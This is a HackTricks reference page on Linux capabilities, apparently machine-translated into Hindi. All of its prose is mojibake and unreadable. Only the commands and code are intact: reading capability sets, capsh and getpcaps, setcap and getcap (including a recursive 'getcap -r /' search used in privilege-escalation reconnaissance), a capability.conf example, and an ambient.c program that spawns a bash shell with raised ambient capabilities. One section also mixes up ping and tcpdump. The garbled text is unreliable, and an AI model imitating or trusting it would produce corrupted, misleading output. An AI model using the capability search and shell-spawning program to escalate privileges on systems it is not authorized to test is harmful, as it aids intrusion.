# рд▓рд┐рдирдХреНрд╕ рдХреНрд╖рдорддрд╛рдПрдВ

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреА рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЗрдЪреНрдЫрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХрд▓ [**NFT**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣ред
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks swag**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ рдореБрдЭреЗ **Twitter** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдХрд╛** рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВред**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ** [**hacktricks рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks-cloud) **рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗ рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред**

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

тАЛтАЛтАЛтАЛтАЛтАЛтАЛтАЛтАЛ[**RootedCON**](https://www.rootedcon.com/) рд╕реНрдкреЗрди рдореЗрдВ рд╕рдмрд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдЗрд╡реЗрдВрдЯ рд╣реИ рдФрд░ рдпреВрд░реЛрдк рдореЗрдВ рд╕рдмрд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдорд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИред рддрдХрдиреАрдХреА рдЬреНрдЮрд╛рди рдХреЛ рдмрдврд╝рд╛рд╡рд╛ рджреЗрдиреЗ рдХреА рдорд┐рд╢рди рдХреЗ рд╕рд╛рде, рдпрд╣ рдХрд╛рдВрдЧреНрд░реЗрд╕ рдкреНрд░реМрджреНрдпреЛрдЧрд┐рдХреА рдФрд░ рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рд╡рд┐рд╢реЗрд╖рдЬреНрдЮреЛрдВ рдХреЗ рд▓рд┐рдП рдПрдХ рдЙрдмрд▓рддрд╛ рд╣реБрдЖ рдорд┐рд▓рди рд╕реНрдерд▓ рд╣реИред

{% embed url="https://www.rootedcon.com/" %}

## рдХреНрд╖рдорддрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдХреНрдпреЛрдВ?

рд▓рд┐рдирдХреНрд╕ рдХреНрд╖рдорддрд╛рдПрдВ рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдЙрдкрд▓рдмреНрдз рд░реВрдЯ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХрд╛ рдПрдХ рдЙрдкрд╕реЗрдЯ рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИрдВред рдЗрд╕рд╕реЗ рд░реВрдЯ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдЫреЛрдЯреЗ рдФрд░ рдЕрд▓рдЧ-рдЕрд▓рдЧ рдЗрдХрд╛рдЗрдпреЛрдВ рдореЗрдВ рд╡рд┐рднрд╛рдЬрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдкреНрд░рддреНрдпреЗрдХ рдЗрдХрд╛рдИ рдХреЛ рдлрд┐рд░ рд╕реЗ рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЛ рд╕реНрд╡рддрдВрддреНрд░ рд░реВрдк рд╕реЗ рдкреНрд░рджрд╛рди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕ рддрд░рд╣ рдкреВрд░реА рдХреНрд╖рдорддрд╛ рд╕реЗрдЯ рдХреЛ рдХрдо рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдЙрддреНрдкреАрдбрд╝рди рдХреЗ рдЬреЛрдЦрд┐рдо рдХреЛ рдХрдо рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рд▓рд┐рдирдХреНрд╕ рдХреНрд╖рдорддрд╛рдУрдВ рдХреА рдХрд╛рдо рдХрд░рдиреЗ рдХреА рдмреЗрд╣рддрд░ рд╕рдордЭ рдХреЗ рд▓рд┐рдП, рд╣рдо рдкрд╣рд▓реЗ рдЙрд╕ рд╕рдорд╕реНрдпрд╛ рдкрд░ рдирдЬрд╝рд░ рдбрд╛рд▓реЗрдВ рдЬрд┐рд╕реЗ рдпрд╣ рд╣рд▓ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддреА рд╣реИред

рдЪрд▓реЛ рдорд╛рди рд▓реЗрддреЗ рд╣реИрдВ рд╣рдо рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдПрдХ рд╕рд╛рдзрд╛рд░рдг рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓рд╛ рд░рд╣реЗ рд╣реИрдВред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рд╣рдо рдЧреИрд░-рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХреГрдд рд╣реИрдВред рд╣рдо рдХреЗрд╡рд▓ рдЙрди рдбреЗрдЯрд╛ рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рд╣рдорд╛рд░реЗ рдкрд╛рд╕, рд╣рдорд╛рд░реЗ рд╕рдореВрд╣ рдХреЗ рдкрд╛рд╕ рд╣реИ, рдпрд╛ рдЬрд┐рд╕реЗ рд╕рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдкрд╣реБрдВрдЪ рдХреЗ рд▓рд┐рдП рдЪрд┐рд╣реНрдирд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рдХрд┐рд╕реА рд╕рдордп рдмрд╛рдж, рд╣рдорд╛рд░реА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдЕрдкрдиреЗ рдХрд░реНрддрд╡реНрдпреЛрдВ рдХреЛ рдкреВрд░рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдереЛрдбрд╝реА рдЕрдзрд┐рдХ рдЕрдиреБрдорддрд┐рдпрд╛рдБ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ, рдЬреИрд╕реЗ рдиреЗрдЯрд╡рд░реНрдХ рд╕реЙрдХреЗрдЯ рдЦреЛрд▓рдирд╛ред рд╕рдорд╕реНрдпрд╛ рдпрд╣ рд╣реИ рдХрд┐ рд╕рд╛рдзрд╛рд░рдг рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реЙрдХреЗрдЯ рдирд╣реАрдВ рдЦреЛрд▓ рд╕рдХрддреЗ, рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕рдХреЗ рд▓рд┐рдП рд░реВрдЯ рдЕрдиреБрдорддрд┐рдпрд╛рдБ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред

## рдХреНрд╖рдорддрд╛ рд╕реЗрдЯ

**рд╡рд┐рд░рд╛рд╕рдд рдХреНрд╖рдорддрд╛рдПрдВ**

**CapEff**: _рдкреНрд░рднрд╛рд╡реА_ рдХреНрд╖рдорддрд╛ рд╕реЗрдЯ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд░реВрдк рд╕реЗ рдЙрди рд╕рднреА рдХреНрд╖рдорддрд╛рдУрдВ рдХреЛ рдкреНрд░рддрд┐рд╖реНрдард╛рди рдХрд░рддреА рд╣реИ рдЬрд┐рдиреНрд╣реЗрдВ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╡рд░реНрддрдорд╛рди рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣реА рд╣реИ (рдпрд╣ рдХреНрд╖рдорддрд╛ рд╕реЗрдЯ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдПрдХрд▓ рдмрд┐рдЯ рд╣реИ рдЬреЛ рдЗрд╕рдХрд╛ рдЗрд╢рд╛рд░рд╛ рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдХреНрд╖рдорддрд╛ рд╕реЗрдЯ рдХреА рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рдмрд╛рдЗрдирд░реА рдЪрд▓рд╛рдиреЗ рдкрд░ рдкреНрд░рднрд╛рд╡реА рд╕реЗрдЯ рдореЗрдВ рд▓реЗ рдЬрд╛рдПрдЧреА)ред рдлрд╝рд╛рдЗрд▓ рдХреНрд╖рдорддрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдкреНрд░рдн
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
рдпрд╣ рдХрдорд╛рдВрдб рдЕрдзрд┐рдХрд╛рдВрд╢ рд╕рд┐рд╕реНрдЯрдореЛрдВ рдкрд░ 5 рдкрдВрдХреНрддрд┐рдпреЛрдВ рдХреЛ рд▓реМрдЯрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред

* CapInh = рд╡рд┐рд░рд╛рд╕рдд рдореЗрдВ рдорд┐рд▓реА рдХреНрд╖рдорддрд╛рдПрдВ
* CapPrm = рдЕрдиреБрдордд рдХреНрд╖рдорддрд╛рдПрдВ
* CapEff = рдкреНрд░рднрд╛рд╡реА рдХреНрд╖рдорддрд╛рдПрдВ
* CapBnd = рд╕реАрдорд┐рдд рд╕реЗрдЯ
* CapAmb = рдкрд░реНрдпрд╛рд╡рд░рдгреАрдп рдХреНрд╖рдорддрд╛рдПрдВ рд╕реЗрдЯ
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
рдпреЗ рд╣реЗрдХреНрд╕рд╛рдбреЗрд╕рд┐рдорд▓ рдирдВрдмрд░реНрд╕ рд╕рдордЭ рдореЗрдВ рдирд╣реАрдВ рдЖрддреЗред рд╣рдо capsh рдпреВрдЯрд┐рд▓рд┐рдЯреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЗрдиреНрд╣реЗрдВ рдХреИрдкреЗрдмрд┐рд▓рд┐рдЯреАрдЬрд╝ рдирд╛рдо рдореЗрдВ рдбрд┐рдХреЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
рдЪрд▓реЛ рдЕрдм рджреЗрдЦрддреЗ рд╣реИрдВ рдХрд┐ `ping` рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА **рдХреНрд╖рдорддрд╛рдПрдВ** рдХреНрдпрд╛ рд╣реИрдВ:
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
рдпрджреНрдпрдкрд┐ рд╡рд╣ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдПрдХ рдФрд░ рдЖрд╕рд╛рди рддрд░реАрдХрд╛ рд╣реИред рдПрдХ рдЪрд▓ рд░рд╣реЗ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреА рдХреНрд╖рдорддрд╛рдУрдВ рдХреЛ рджреЗрдЦрдиреЗ рдХреЗ рд▓рд┐рдП, рд╕реАрдзреЗ **getpcaps** рдЙрдкрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдФрд░ рдЗрд╕рдХреЗ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдЖрдИрдбреА (PID) рдХреЗ рдмрд╛рдж рдЬрд╛рдПрдВред рдЖрдк рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдЖрдИрдбреА рдХреА рд╕реВрдЪреА рднреА рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```bash
getpcaps 1234
```
рдпрд╣рд╛рдВ рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ `tcpdump` рдХреА рдХреНрд╖рдорддрд╛рдУрдВ рдХрд╛ рдХреНрдпрд╛ рд╣рд╛рд▓ рд╣реИ рдЬрдм рдмрд╛рдЗрдирд░реА рдХреЛ рдкрд░реНрдпрд╛рдкреНрдд рдХреНрд╖рдорддрд╛рдПрдВ ( `cap_net_admin` рдФрд░ `cap_net_raw`) рджреА рдЧрдИ рд╣реИрдВ рддрд╛рдХрд┐ рдиреЗрдЯрд╡рд░реНрдХ рдХреЛ рд╕реНрдирд┐рдл рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ (_tcpdump рдкреНрд░рдХреНрд░рд┐рдпрд╛ 9562 рдореЗрдВ рдЪрд▓ рд░рд╣рд╛ рд╣реИ_):
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
рдЬреИрд╕рд╛ рдХрд┐ рдЖрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ, рджрд┐рдП рдЧрдП capabilities рдПрдХ рдмрд╛рдЗрдирд░реА рдХреЗ capabilities рдХреЗ рд╕рд╛рде рдореЗрд▓ рдЦрд╛рддреЗ рд╣реИрдВред
_getpcaps_ рдЯреВрд▓ **capget()** рд╕рд┐рд╕реНрдЯрдо рдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдПрдХ рд╡рд┐рд╢реЗрд╖ thread рдХреЗ рд▓рд┐рдП рдЙрдкрд▓рдмреНрдз capabilities рдХреЛ рдкреНрд░рд╢реНрди рдХрд░ рд╕рдХреЗред рдЗрд╕ рд╕рд┐рд╕реНрдЯрдо рдХреЙрд▓ рдХреЛ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреЗрд╡рд▓ PID рдкреНрд░рджрд╛рди рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред

### рдмрд╛рдЗрдирд░реА рдХреНрд╖рдорддрд╛рдПрдВ

рдмрд╛рдЗрдирд░реА рдХреЛ рдХреНрд╖рдорддрд╛рдПрдВ рд╣реЛ рд╕рдХрддреА рд╣реИрдВ рдЬреЛ рдХрд╛рд░реНрдпрд╛рдиреНрд╡рдпрди рдХреЗ рджреМрд░рд╛рди рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, `ping` рдмрд╛рдЗрдирд░реА рдореЗрдВ `cap_net_raw` рдХреНрд╖рдорддрд╛ рдХреЗ рд╕рд╛рде рдорд┐рд▓рдирд╛ рдмрд╣реБрдд рд╕рд╛рдорд╛рдиреНрдп рд╣реИ:
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдХреНрд╖рдорддрд╛рдУрдВ рдХреЗ рд╕рд╛рде рдмрд╛рдЗрдирд░реА рдЦреЛрдЬ рд╕рдХрддреЗ рд╣реИрдВ**:
```bash
getcap -r / 2>/dev/null
```
### capsh рдХреЗ рд╕рд╛рде capabilities рдХреЛ рдЫреЛрдбрд╝рдирд╛

рдпрджрд┐ рд╣рдо _ping_ рдХреЗ рд▓рд┐рдП CAP\_NET\_RAW capabilities рдХреЛ рдЫреЛрдбрд╝ рджреЗрдВ, рддреЛ ping рдЙрдкрдпреЛрдЧреАрддрд╛ рдХрд╛рдо рдирд╣реАрдВ рдХрд░реЗрдЧреАред
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, _capsh_ рдХреА рдЖрдЙрдЯрдкреБрдЯ рдХреЗ рд╕рд╛рде, _tcpdump_ рдХрдорд╛рдВрдб рднреА рдПрдХ рддреНрд░реБрдЯрд┐ рдЙрдард╛рдиреА рдЪрд╛рд╣рд┐рдПред

> /bin/bash: /usr/sbin/tcpdump: рдСрдкрд░реЗрд╢рди рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рд╣реИ

рдпрд╣ рддреНрд░реБрдЯрд┐ рд╕реНрдкрд╖реНрдЯ рд░реВрдк рд╕реЗ рджрд┐рдЦрд╛рддреА рд╣реИ рдХрд┐ рдкрд┐рдВрдЧ рдХрдорд╛рдВрдб рдХреЛ рдПрдХ ICMP рд╕реЙрдХреЗрдЯ рдЦреЛрд▓рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рд╣реИред рдЕрдм рд╣рдо рдирд┐рд╢реНрдЪрд┐рдд рд░реВрдк рд╕реЗ рдЬрд╛рдирддреЗ рд╣реИрдВ рдХрд┐ рдпрд╣ рдЙрдореНрдореАрдж рдХреЗ рдЕрдиреБрд╕рд╛рд░ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИред

### рдХреНрд╖рдорддрд╛рдУрдВ рдХреЛ рд╣рдЯрд╛рдПрдВ

рдЖрдк рдХрд┐рд╕реА рдмрд╛рдЗрдирд░реА рдХреА рдХреНрд╖рдорддрд╛рдУрдВ рдХреЛ рд╣рдЯрд╛ рд╕рдХрддреЗ рд╣реИрдВред
```bash
setcap -r </path/to/binary>
```
## рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреНрд╖рдорддрд╛рдПрдВ

рд╢рд╛рдпрдж **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рднреА рдХреНрд╖рдорддрд╛рдПрдВ рдЕрд╕рд╛рдЗрди рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ**ред рдпрд╣ рд╢рд╛рдпрдж рдЗрд╕рдХрд╛ рдЕрд░реНрде рд╣реИ рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣рд░ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреНрд╖рдорддрд╛рдУрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХреЗрдЧреАред\
[рдЗрд╕](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7), [рдЗрд╕](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html) рдФрд░ [рдЗрд╕](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user) рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдХреБрдЫ рдлрд╝рд╛рдЗрд▓реЗрдВ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рдиреА рд╣реЛрдЧреА рддрд╛рдХрд┐ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдирд┐рд╢реНрдЪрд┐рдд рдХреНрд╖рдорддрд╛рдПрдВ рджреА рдЬрд╛ рд╕рдХреЗрдВ, рд▓реЗрдХрд┐рди рдХреНрд╖рдорддрд╛рдПрдВ рдкреНрд░рддреНрдпреЗрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдЕрд╕рд╛рдЗрди рдХрд░рдиреЗ рд╡рд╛рд▓рд╛ рдлрд╝рд╛рдЗрд▓ `/etc/security/capability.conf` рд╣реЛрдЧреАред\
рдлрд╝рд╛рдЗрд▓ рдЙрджрд╛рд╣рд░рдг:
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## рдкрд░реНрдпрд╛рд╡рд░рдг рдХреНрд╖рдорддрд╛рдПрдВ

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрд╛рд░реНрдпрдХреНрд░рдо рдХреЛ рдХрдВрдкрд╛рдЗрд▓ рдХрд░рдХреЗ **рдХреНрд╖рдорддрд╛рдПрдВ рдкреНрд░рджрд╛рди рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдПрдХ рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВ рдПрдХ рдмреИрд╢ рд╢реИрд▓ рдЙрддреНрдкрдиреНрди рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ**ред

{% code title="ambient.c" %}
```c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```
{% endcode %}
```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
**рдмрд╛рд╢** рдореЗрдВ **рдХрдВрдкрд╛рдЗрд▓реНрдб рд╡рд╛рддрд╛рд╡рд░рдг рдмрд╛рдЗрдирд░реА рджреНрд╡рд╛рд░рд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рдХреЗ рдЕрдВрджрд░, **рдирдИ рдХреНрд╖рдорддрд╛рдПрдВ** рджреЗрдЦрдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рд╣реЛрддреА рд╣реИ (рдПрдХ рд╕рд╛рдзрд╛рд░рдг рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ "рд╡рд░реНрддрдорд╛рди" рдЦрдВрдб рдореЗрдВ рдХреЛрдИ рдХреНрд╖рдорддрд╛ рдирд╣реАрдВ рд╣реЛрдЧреА)ред
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
{% hint style="danger" %}
рдЖрдк **рдХреЗрд╡рд▓ рдЙрди capabilities рдХреЛ рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ permitted рдФрд░ inheritable рд╕реЗрдЯ рдореЗрдВ рдореМрдЬреВрдж рд╣реИрдВ**ред
{% endhint %}

### рдХреНрд╖рдорддрд╛-рдЬрд╛рдЧрд░реВрдХ/рдХреНрд╖рдорддрд╛-рдореВрд░реНрдЦ рдмрд╛рдЗрдирд░реА

